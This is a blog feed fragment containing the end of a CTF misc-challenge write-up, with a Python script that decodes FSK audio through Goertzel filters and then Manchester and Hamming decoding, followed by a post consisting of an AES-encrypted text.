class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># decode.py</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">Decode a wav file using a Goertzel filter.</span></span><br><span class=\"line\"><span class=\"string\">Modified from https://github.com/laurenschneider/audiodecoder</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> goertzel <span class=\"keyword\">import</span> Goertzel</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> scipy.io <span class=\"keyword\">import</span> wavfile</span><br><span class=\"line\"></span><br><span class=\"line\">DATA = os.path.dirname(os.path.abspath(__file__))</span><br><span class=\"line\">filepath = os.path.join(DATA, <span class=\"string\">&quot;filename.wav&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Read sample rate and data from audio file</span></span><br><span class=\"line\">rate, data = wavfile.read(filepath)</span><br><span class=\"line\"></span><br><span class=\"line\">message = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">bit_string = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">mark_freq = <span class=\"number\">2225</span></span><br><span class=\"line\">space_freq = <span class=\"number\">2025</span></span><br><span class=\"line\">mark_filter = Goertzel(rate, mark_freq)</span><br><span class=\"line\">space_filter = Goertzel(rate, space_freq)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># calculate coefficients for each filter</span></span><br><span class=\"line\">mark_filter.calculate_coeff()</span><br><span class=\"line\">space_filter.calculate_coeff()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(data.size + <span class=\"number\">1</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># for each chunk of 160 samples</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> i%<span class=\"number\">160</span> == <span class=\"number\">0</span> <span class=\"keyword\">and</span> i != <span class=\"number\">0</span>:</span><br><span class=\"line\">        start = i - <span class=\"number\">160</span></span><br><span class=\"line\">        end = i</span><br><span class=\"line\">        samples = data[start:end]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># get amplitutes of sample set</span></span><br><span class=\"line\">        mark_amp = mark_filter.<span class=\"built_in\">filter</span>(samples)</span><br><span class=\"line\">        space_amp = space_filter.<span class=\"built_in\">filter</span>(samples)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mark_amp &gt; space_amp:</span><br><span class=\"line\">            <span class=\"comment\"># bit is 1</span></span><br><span class=\"line\">            to_add = <span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># bit is zero</span></span><br><span class=\"line\">            to_add = <span class=\"string\">&#x27;0&#x27;</span></span><br><span class=\"line\">        bit_string = to_add + bit_string</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>, <span class=\"built_in\">len</span>(bit_string)+<span class=\"number\">10</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> x%<span class=\"number\">10</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">        start = x - <span class=\"number\">9</span></span><br><span class=\"line\">        end = x - <span class=\"number\">1</span></span><br><span class=\"line\">        message = <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(bit_string[start:end],<span class=\"number\">2</span>)) + message</span><br><span class=\"line\"><span class=\"built_in\">print</span>(message)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># set target frequencies</span></span><br><span class=\"line\">mark_freq = <span class=\"number\">1270</span></span><br><span class=\"line\">space_freq = <span class=\"number\">1070</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># create two filters</span></span><br><span class=\"line\">mark_filter = Goertzel(rate, mark_freq)</span><br><span class=\"line\">space_filter = Goertzel(rate, space_freq)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># calculate coefficients for each filter</span></span><br><span class=\"line\">mark_filter.calculate_coeff()</span><br><span class=\"line\">space_filter.calculate_coeff()</span><br><span class=\"line\"></span><br><span class=\"line\">bit_string = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">message = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(data.size + <span class=\"number\">1</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># for each chunk of 160 samples</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> i%<span class=\"number\">160</span> == <span class=\"number\">0</span> <span class=\"keyword\">and</span> i != <span class=\"number\">0</span>:</span><br><span class=\"line\">        start = i - <span class=\"number\">160</span></span><br><span class=\"line\">        end = i</span><br><span class=\"line\">        samples = data[start:end]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># get amplitutes of sample set</span></span><br><span class=\"line\">        mark_amp = mark_filter.<span class=\"built_in\">filter</span>(samples)</span><br><span class=\"line\">        space_amp = space_filter.<span class=\"built_in\">filter</span>(samples)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mark_amp &gt; space_amp:</span><br><span class=\"line\">            to_add = <span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            to_add = <span class=\"string\">&#x27;0&#x27;</span></span><br><span class=\"line\">        bit_string = to_add + bit_string</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">HammingBolck</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span>(<span class=\"built_in\">len</span>(message)==<span class=\"number\">15</span>)</span><br><span class=\"line\">    message=message[::-<span class=\"number\">1</span>]</span><br><span class=\"line\">    code = <span class=\"number\">0</span></span><br><span class=\"line\">    m_pos = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ind+<span class=\"number\">1</span>)&amp;(ind): <span class=\"comment\"># Not parity check bit</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">int</span>(message[m_pos],<span class=\"number\">2</span>):</span><br><span class=\"line\">                code = code ^ (<span class=\"number\">1</span>&lt;&lt;ind)</span><br><span class=\"line\">                code = code ^ (((ind+<span class=\"number\">1</span>)&amp;<span class=\"number\">0b1</span>)&lt;&lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">                code = code ^ (((ind+<span class=\"number\">1</span>)&amp;<span class=\"number\">0b10</span>)&lt;&lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">                code = code ^ (((ind+<span class=\"number\">1</span>)&amp;<span class=\"number\">0b100</span>)&lt;&lt;<span class=\"number\">1</span>)</span><br><span class=\"line\">                code = code ^ (((ind+<span class=\"number\">1</span>)&amp;<span class=\"number\">0b1000</span>)&lt;&lt;<span class=\"number\">4</span>)</span><br><span class=\"line\">            m_pos = m_pos + <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    code = code ^ (<span class=\"number\">1</span>&lt;&lt;random.randint(<span class=\"number\">0</span>,<span class=\"number\">19</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&#123;0:020b&#125;&quot;</span>.<span class=\"built_in\">format</span>(code)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;from &quot;</span>+message+<span class=\"string\">&quot; to &quot;</span>+retStr)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">HammingBolckInv</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span>(<span class=\"built_in\">len</span>(message)==<span class=\"number\">20</span>)</span><br><span class=\"line\">    code = <span class=\"built_in\">int</span>(message,<span class=\"number\">2</span>)</span><br><span class=\"line\">    wrong = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"number\">1</span>&lt;&lt;ind)&amp;code:</span><br><span class=\"line\">            wrong = wrong ^ (ind+<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> wrong:</span><br><span class=\"line\">        code = code ^ (<span class=\"number\">1</span>&lt;&lt;(wrong-<span class=\"number\">1</span>))</span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ind+<span class=\"number\">1</span>)&amp;(ind): <span class=\"comment\"># Not parity check bit</span></span><br><span class=\"line\">            retStr = retStr + (<span class=\"string\">&quot;1&quot;</span> <span class=\"keyword\">if</span> code&amp;(<span class=\"number\">1</span>&lt;&lt;ind) <span class=\"keyword\">else</span> <span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr[::-<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Hamming</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(message),<span class=\"number\">15</span>):</span><br><span class=\"line\">        retStr = retStr + HammingBolck(message[ind:ind+<span class=\"number\">15</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">HammingInv</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(message),<span class=\"number\">20</span>):</span><br><span class=\"line\">        retStr = retStr + HammingBolckInv(message[ind:ind+<span class=\"number\">20</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manchester</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> message:</span><br><span class=\"line\">        retStr += <span class=\"string\">&quot;01&quot;</span> <span class=\"keyword\">if</span> char==<span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">else</span> <span class=\"string\">&quot;10&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manchesterInv</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(message), <span class=\"number\">2</span>):</span><br><span class=\"line\">        char = message[ind]</span><br><span class=\"line\">        retStr += <span class=\"string\">&quot;0&quot;</span> <span class=\"keyword\">if</span> char==<span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">else</span> <span class=\"string\">&quot;1&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr</span><br><span class=\"line\"></span><br><span class=\"line\">bit_string=bit_string[::-<span class=\"number\">1</span>]</span><br><span class=\"line\">bit_string = HammingInv(manchesterInv(bit_string))[::-<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>, <span class=\"built_in\">len</span>(bit_string)+<span class=\"number\">10</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> x%<span class=\"number\">10</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">        start = x - <span class=\"number\">9</span></span><br><span class=\"line\">        end = x - <span class=\"number\">1</span></span><br><span class=\"line\">        message = <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(bit_string[start:end],<span class=\"number\">2</span>)) + message</span><br><span class=\"line\"><span class=\"built_in\">print</span>(message)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"7-Final-Words\"><a href=\"#7-Final-Words\" class=\"headerlink\" title=\"7. Final Words\"></a>7. Final Words</h3><p>In my eyes, a good misc problem should not be an annoying puzzle. Steps to solve a misc problem have to be reasonable. For example, in this problem, Manchester coding is applied after the application of Hamming coding: that’s because the former is channel coding, and the latter is source coding. We shouldn’t just pick some random encryption and apply it to plaintext.</p>\n<p> I have made my best to make the solving process more natural. I hope you enjoy digging deep into the problem. You’ll earn much more fun than those who can just use tools written by others without understanding fundamental principles (like me).</p>\n<p>ご武運を！</p>\n",
            "tags": [
                "Misc",
                "Write-Up",
                "出题"
            ]
        },
        {
            "id": "http://cubicy.icu/2021/11/09/WriteUp%20%E6%97%A5%E5%93%ADschool-bus%20%E4%B8%8A%E4%BA%86%E9%82%A3%E4%B8%AAwriteup/",
            "url": "http://cubicy.icu/2021/11/09/WriteUp%20%E6%97%A5%E5%93%ADschool-bus%20%E4%B8%8A%E4%BA%86%E9%82%A3%E4%B8%AAwriteup/",
            "title": "WriteUp 日哭school-bus 上了那个writeup",
            "date_published": "2021-11-09T03:08:00.000Z",
            "content_html": "<p>密钥请找本人索取^_^<br>AES CBC Zero padding 128bits&#x2F;block IV&#x3D;0  UTF-8<br>qboAHUOHL+uw94b2elojCJWHWKwqPtIwFzSDKPZqmHPSu0APpp7H0ibcQNIUgrwDCCwdydqP+T74+slwNh6PM4GTvT1CoF2thGIZi5yCS9HfleGi5hP58rxFM3HzQxaU9EcxOEYbtGObactrCOzKP&#x2F;+tPittHwWWiL5uEQyt8ESrZlgr19O5mtM4zrkRoODCUtcna5XWuatk94T60ToF6ZrhqTb5v60dcwGjw3Zf1xaBRvYR2HltlogOzs&#x2F;QoLrDm&#x2F;gzGqxvddGPCaOEkF5nCzk4un7sl6RJD77GVxRA4IqYMSExrw&#x2F;By3bqLJyL+3waQihC4E3teqyknbLGbYCtF5VKV32WmE8H0hEyP0KkpO6MTJBiz4mziI3M0+pmoTXIRiBSpISAGq7RbKMIs2cOFD7Baxx+vUXuCShr7ZExYTi3bHD3r435&#x2F;F4WXA9NuFaNM5Lhu+rmFBRobYZ2Ur3BBIFDlTT6gI5XXgoVj9qhHx5DJWFlGcglkgefiabVxUmTFFohZPLnpJxGJByTi6Frw+epqfZkrY0eGTMPIBKcwQDqh1DnPDyxm+64Xr5fffzpmG&#x2F;HNyq8Nsa1qpk8Yw+Vu4l03oDZ9CX0msubse852dj0ySNKgYXSOKnYet8jdjSC2eVd14nypMuok1BPUoHMv4rlme813n&#x2F;lE8LehT5xRF8R+HFyxfsRb354Xr39YX5DpI61tS41P1A+IiXbWvGG7kUk7Ln4mV+UJe6FEWzNzD5f0o3thGCoYd7ccyUrVJTbFsnbz7wuCmWS9dFkx3QAOxkGcbgyPh9NtbkcfKYa&#x2F;znW6GibzQf3NQZ2W4jQl&#x2F;wEtVPMs1BzweyAI3XGoJy7ZdHrvrswzdSq9rrcJLYW8TLG4lCowCRwb0gx1d9RptT4Tnj15poEl3zW66+L9dSb6RxTgsWrh0MM20xHmLmAEkoVG5QtGpZjQUIiKrq2BDahZtKWQayM1c+x8PtdZysfGYxyW+nzq&#x2F;frGKmEKwo8GMqiLwevXk1aLryVVf57ofS56w+cyYAwmJtJ3ZKyeV26k4+WkV7EHBrTbItrz8EG8uP1eTzz922bAOhdWVck80iAc2QeolUYa6Ohp4GPP0tN2Q+CtBuPgjaPERjt42ZfhmstjJ9OoOiFObtUH72Rvg0i8aK+NsaSM48jxxuCJ8atXf57uu6giunfmaGaQ8fbdd395Sq7mTbvUiTVEn9tQX23xYfKcpnHSPMGfdcmeL5LdYg153QHLRLJ79&#x2F;vFbTKt6iLLbcImzlNgs70xE78rKHG3YFrrGwd41&#x2F;DSOxLqHYE5tiHkb32Haoy+&#x2F;d6NAAzahYrhx2x28DVDmJbotGIEjpCw4hvWSwAkT3toy0aRE5XpVpzzqXqxaSTteM+Vifzr&#x2F;+zynUM7SUwbMvONbqyhqC6tKtYtEOFoknu80e20Id7Ja9nfWH8s0Z7iWeb0p&#x2F;8i5yHvZVuuYFnDkcOz1z7VGmi6B7W2KTp9BWcjTupzxH+pnoGV+hMUHFiBoYrZJzt5bFpvOzEYJDHhq4oh8jxZMeKADJBwDfoNFaBeN2tVS93HJ1tT18YwI4BsxiDjBuX351JfepxVrP0d0DNlT&#x2F;rYgCyeXzIiz244JReySuLe6mALcEg0htTn7oZt6yONG1LVq8mfQ6GXrSqIaeBbNrfP3FF7C+7Vri45CvV39Rnt9y2r3eKdOW2VGf+8XZ8JBWKwpT65u1lKxim+FDxxmqxY1nStKtm3v6K5FtcsBz3LmNBJPB9oaILV10XWIPVVOpgD4MwV4XFT&#x2F;vpgoVhL0Det0atbj1KBG8A0dhLZwcWx72l&#x2F;yuAoCLuMoXciNPsVmngkkuCFVEziPxgPqVfPQTbGQbk4raRfOkCbkK5nAS4MTeEfr61fvQwYVXPYRTXDx1DWbTUABHbG0e5f8OG7fKNpC8c8m94sZM6osTLAdus73OC5Lj&#x2F;iHsOYgjfkW1KRnL7W5b2UOdNgUVyQueSNBmQEw4sW9J5+LWYd4NRE0qL8TLrjhL26u6L6RBVMEJomjcAQnOBGIiBVl4jSAgt1HcpnDn7JyV95Th5pPEJ7YGtgLkBkuvIpiIW9sGLwWJsWkJwQXyFTSxMaJeaxyz6q725nxYXrIXIq7uGUJrDaN60GNnwgL&#x2F;swzqqlmF0gdorXScCHc06roB+27rYV3kEEguhmsyoyxHdX4J33BEXeqigi3JaTrsVafApgIKZYhN&#x2F;uH5UKHgZ4Xr8Qq&#x2F;aTVcnv8ovm6jwTZRnQFCZaPKQ995TL5Rfm8gF4ejv32i2g&#x2F;0F1bxwJ3sqYCEo4cDtsWXeAY9pidVji6BHZ25oSuiYb2G7TBpfoo26Ey8e4l5zM0KRgeBmk6g3iXILfY6DH71fjzptJ+H4I5anThAZMycGTkr7UzknBxCluU98JK4WQnU3klY4E4ZZbHrYGmO3UwRxEzyqfFVB4JFSDbuWy4OJzmDCX+LFMAD5PfOKIDAIQ1Skm6j&#x2F;UqPXoVIZelOk0A57WCZ+&#x2F;eP0O5fpc1JhtkPkvfr7yQjFIHtRbJb2toReQxHtLvrFhAyBvC28xxI63fX&#x2F;C1At2u3agpy4KnUzAwdVAUVq9f2DjxTkrh3btk83i8aLG2QQvg6DCr7KB9Tw4exkc6MMxtjtpbwgZx0dLsh&#x2F;SyYBTRs+LgsfsBLVg5FhviLay+47uuXl6CQBZHQXcBl8LmRxOrYsHQnkgQ1qBpl7uJO5ru1rTMdbDP4+TSoxNcUEFZcHal0Baz4Srikc447dhDkvPtnEdIdxJEN5xnbHqd0EsE1f3Dn2vQLcQ7BeYWWUGLCdLte95y6EdYvL1r96Ggqv6izkQ&#x2F;aImw5Hif5KPuGt1Og8GPPlywv8wIDpi&#x2F;7V2Xw1FCOuJXSQRJjoKow87AcpKmmjKEHew0QdI6cOEBDwZki5bjFA9j6LW3NckoFOu7QTaA5alDsTWKJMnwHEN6Mn3IfoPVs7bqM9q6sPmDyoVUd8AjgA2iYkaJlS8TcXqWLl7z&#x2F;4F5GjmmV7a9hcY&#x2F;ClYN7zhagdUaFakLKkw0ngzsjZP45&#x2F;Hn0HWUfDH7NaLLovWi&#x2F;wKXYqrrMZkvKqVDhSD4U57zKCS05tBg0jqoW2digZPvzHJHDq2UV5o&#x2F;9MaIyTPgzU7JhUTrKOD+HzX3ZYvsFrmUfx9eiCVK57OkxfDGrzmVCgjX9ZIn2r0UzEbI1mfjHq75DiES38S2g67ypcnjnX4&#x2F;o2qmHI9GR7xzsB70Ol96WGcoOvYn2v6&#x2F;ldWx8dGOBRiTXUWve4jgtdCWupi4O8AikIhktX8sTJ+VBEhNr9negjA+FQj3y1xaPYl4LTyzpgiaeIDBUZnyt8Lgl&#x2F;fi&#x2F;Nm12nQDhE2vEJ3R2cjciLWG50b6U+9r94bS0nzbY0uupbI+fep8DE7ty4NHo0TtFF&#x2F;58f49MEj7c56AWzLGanI+OnYqYJ7w5tCbhY4V01jYYwEX6Ur0GWOZvsmOeR1kCSMLVWRcNipjOBr8LA9JeTfVr0WPyvl4rBD0RJ2ITrP3jn85iHVYMUCmTiXaav6poh1+WCPYM2J9q4bdwK1TBxX2vBCv33t&#x2F;e6wABwqh5wsy1APhgzL1ZTZrSsnCNfnPXbJXtWCaexkYF58gRZ3+I2XZgYvmj37TT53qhayl7sNImuGLFWuWVH0um+ldqP1u0joF+&#x2F;BiJTD1gbgtSE+HW3r+Ntd5OgQBbXHhy54d4ABucD7RqFS95GlwadZV6v4AjJFKFYh1rnDZHKVDT9Ux301iTmwFvPatYPwCyJAmJ4bndBzhmwDl&#x2F;yU8KFuZ8zbA8yUr5nrtSu9A&#x2F;I6rsRtMdKQTJMRZ4iL5s1zmZTzPVF1&#x2F;VOoqIVLP8kDtuyyxVXGUcufl6nIHCYoQlbvvXQV3TWIlnut2uWxuedeTuOS3vQj1JDnmkEnc&#x2F;BmjeY2zGFgxtDpTjwW&#x2F;Eh9SFJq9ZctkGkPdwrXCXr+DThhguEGXS7fGJeScW5fN0&#x2F;u1w&#x2F;V4c4VW9&#x2F;GNDBZRuG6AyUjEjVABlBj4fER+2vhhzgnzhTnh+j5qNpMFy7Jhd0gmLgdywSUTrK2U96l9tcZYnIMOnLlAzinaqDauE9KigK+x4tWxEW9LMmfCsmV72BRaIpx8xrrmvaF0DYLKCqxvY3SdCU3YIxA6iIMhShTN15M6znJzq8kufcm6FJ+iO6bzDnDLSwdUteGfQCgHKAK4S&#x2F;NPsChjP5OB&#x2F;qWZsq1KCFTUh1+04E+F2oHfwMUitqLV1blL4KPUeImUx0ldbeXHtEMxHwWX9CQbU2Ksd9iyCB9oye4ANR5FDpYJBC5Yvb9SAMW18zT99I2FfS6S5umUDm&#x2F;uTR0V3fAjWMDwwjhuWH9YZRqOADr9UXNHdJn5M4MagfplbfBdWWiU0Waxc+14EZkX0&#x2F;62UKO5YyZzkHrv2X0jckDbGFuG29fY6PJOnmY+UN6JhOJ52OfrjR4KIrp2SORgHzEUqD6YzF8zhmBsMZ8AY9&#x2F;GMAGLbV1zhbuIls5FzIX1JdeJNzEUt31nIz5rEfhgXQa5eHFUqxrE7xZTzajOG0e&#x2F;CF&#x2F;xJeTt85iii40wTADQ875fgxnR6hBbqVGb6PVKekN&#x2F;1CNbCyqyp&#x2F;NbS8rS5Q+49NVtF8anddxlb6PkliqxlKlrBUmQKDT1d5tgkEeyNj8cBS4Ve3bJG4Pd526iqqmyW8y&#x2F;EiGLa6RwVe9VmUB2qp&#x2F;4GlWqZ&#x2F;tb4Z5T4KkXvpEv6MtV5+DHyjqlDNSmYcFL9N8Zk31TyVckkMWxcrvYZ+gZnCGqiQQPmCXhYfGlaMDkBhAZNSBZwX0c1fyKNCu7wA2D29l&#x2F;NquX2VfowrYAExOVlh6Gpa0O0BlyqCJYwI0lnaPpqhnhaDO6mTiokYuWOiQnSrVRBGHk2cxLKt0VH&#x2F;hL92mWc13+AmEemKcOJJaj9RRAWZ0t3H7WjgMhJgR26xJufcfES74EM1FEta1s8vboiDfcTOwXCdUInCnV0Pq2atGpq4oCxuM8YdlR+iopxMehFm&#x2F;FdR5tedsLN87jJIEC&#x2F;CJcWYLF3wE4lt9NOJk10ZHRxSgLS6&#x2F;42fGTFx+chZaN7JxAFhKPttpz3PG038aclzC7G&#x2F;fR0wUXnoi0U2Aide+DZfRWLn05rPDMRuodYTLet&#x2F;4GdbIgdGOqa0LReMei3+g8Ej+h2s0qRxb5fyixwjwCO1HDny5tK4Y3iG&#x2F;KbGXo0vsMymGcAQNphEn94EHk6oaBlHRbgtcwWOEqMlSLLyI5z3OqmoxK6WLj0Kw9g3YiSFSYhCNwa9gw9032cRSLxWDhGGBSF5T9wmjn2J7y4jgg1qrlQa1oTJ+Ep1jBsTQKJIds+E&#x2F;+XK3&#x2F;dCQLIBWkcQFGXblOkukLR&#x2F;uhCdMhhLcbsz1GqYI&#x2F;29K7A6uj+zm8Ep&#x2F;uLgpBQFrxFuIUYFQ4&#x2F;1OO&#x2F;ZkuscEGirPyeDkVeRHVjCt6JFCWUFC0X6ZNtbmSyD51BFNmv+gJroUxhddlWDADjDWI63N7tTWIP